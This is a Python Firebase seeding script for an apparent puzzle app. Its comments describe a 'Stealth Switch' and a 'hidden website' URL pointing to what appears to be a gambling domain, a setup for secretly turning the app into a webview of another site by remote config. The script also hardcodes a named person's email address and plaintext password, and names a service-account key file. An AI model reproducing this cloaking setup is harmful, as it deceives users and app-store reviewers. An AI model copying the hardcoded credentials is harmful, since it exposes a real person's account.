import firebase_admin
from firebase_admin import credentials
from firebase_admin import firestore
from firebase_admin import auth
import os
import sys

# Thiết lập encoding cho stdout để tránh lỗi Unicode trên Windows
if sys.stdout.encoding != 'utf-8':
    import io
    sys.stdout = io.TextIOWrapper(sys.stdout.buffer, encoding='utf-8')

# Đường dẫn đến file key
service_account_path = os.path.join('NEW', 'bocwebpuzzle-firebase-adminsdk-fbsvc-653f22efcf.json')

if not os.path.exists(service_account_path):
    print(f"ERROR: Cannot find key file at {service_account_path}")
else:
    try:
        # 1. Khởi tạo Firebase Admin
        cred = credentials.Certificate(service_account_path)
        firebase_admin.initialize_app(cred)

        db = firestore.client()

        def seed_data():
            print("START: Seeding data to Firestore...")

            # --- Cấu hình Stealth Switch (settings/settings_admin) ---
            settings_ref = db.collection('settings').document('settings_admin')
            settings_data = {
                'webView': 'off' 
            }
            settings_ref.set(settings_data)
            print("SUCCESS: Updated collection 'settings' (doc: settings_admin)")

            # --- Cấu hình URL trang web ẩn (webdata/webdata) ---
            webdata_ref = db.collection('webdata').document('webdata')
            webdata_data = {
                'defaultWebViewUrl': 'https://vwin88.life/' 
            }
            webdata_ref.set(webdata_data)
            print("SUCCESS: Updated collection 'webdata' (doc: webdata)")

            # --- Đăng ký và cấu hình User lephambinh05@gmail.com ---
            email = 'lephambinh05@gmail.com'
            password = 'Binh2005@'
            display_name = 'Lê Phạm Bình'
            uid = None
            try:
                user = auth.create_user(
                    email=email,
                    password=password,
                    display_name=display_name,
                )
                uid = user.uid
                print(f"SUCCESS: Created Auth user {email} (UID: {uid})")
            except auth.EmailAlreadyExistsError:
                user = auth.get_user_by_email(email)
                uid = user.uid
                auth.update_user(uid, password=password, display_name=display_name)
                print(f"SUCCESS: Updated existing Auth user {email} (UID: {uid})")

            if uid:
                user_ref = db.collection('users').document(uid)
                user_data = {
                    'displayName': display_name,
                    'email': email,
                    'xp': 150,
                    'level': 1,
                    'totalTime': 0,
                    'winStreak': 0,
                    'createdAt': firestore.SERVER_TIMESTAMP
                }
                user_ref.set(user_data, merge=True)
                print(f"SUCCESS: Seeded Firestore document for UID {uid}")

            print("\nDONE: Firebase seeding completed successfully.")

        seed_data()
    except Exception as e:
        print(f"CRITICAL ERROR: {e}")

